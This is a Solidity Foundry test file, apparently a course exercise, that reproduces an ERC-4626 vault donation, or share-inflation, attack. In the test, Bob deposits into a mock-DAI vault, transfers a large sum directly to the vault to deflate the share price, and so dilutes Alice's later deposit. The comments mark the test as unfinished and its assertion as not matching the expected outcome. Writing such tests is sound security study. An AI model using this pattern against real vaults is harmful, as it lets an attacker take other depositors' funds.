// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../../src/week2/Vault.sol";
import {MockDai} from "../../src/week2/MockDai.sol";

contract ERC4626Attack is Test {

    Vault private vault;
    MockDai private mockDai;

    address public admin = makeAddr("Admin");
    address public bob = makeAddr("Bob");
    address public alice = makeAddr("Alice");

    function setUp() public {
        mockDai = new MockDai("MockDai", "MDAI");
        vault = new Vault(mockDai, "Vault", "VLT");
        // Fund Alice and Bob with 10000 DAI
        mockDai.transfer(alice, 10_000_000 ether);
        mockDai.transfer(bob, 10_000_000 ether);
        // Approvals by bob and alice on Vault contract
        vm.prank(alice);
        mockDai.approve(address(vault), 10_000_000 ether);
        vm.prank(bob);
        mockDai.approve(address(vault), 10_000_000 ether);
    }

    function testAttack() public {
        // 1. Bob deposits 1000 DAI and get issued 1000 shares of Vault tokens
        // 2. Alice tries depositing 100 DAI and should get issued 100 shares of Vault tokens
        // 3. Before Alice could deposit, Bob donates 1000_000 DAI to the Vault to reduce the share price resulting in Alice getting 0 shares
        vm.startPrank(bob);
        vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
        mockDai.transfer(address(vault), 1000_000 ether);
        vm.stopPrank();
        vm.prank(alice);
        vault.deposit(100 ether, alice); // Alice was supposed to get 100 shares but will now receive 100*1000/1000_000
        uint256 noOfSharesReceivedInitially = vault.balanceOf(bob); // CORRECT THIS
        vm.prank(bob);
        vault.redeem(noOfSharesReceivedInitially, bob, bob); // Bob redeems all his shares
        assertEq(vault.balanceOf(alice), 0); // Alice should get 0 shares but getting 99900099900099900 shares (< 10 ** 18, but should be 0 ideally)
        // assertGt(mockDai.balanceOf(bob), 1001_000 ether); // Bob gets more than his initial assets deposited
    }
}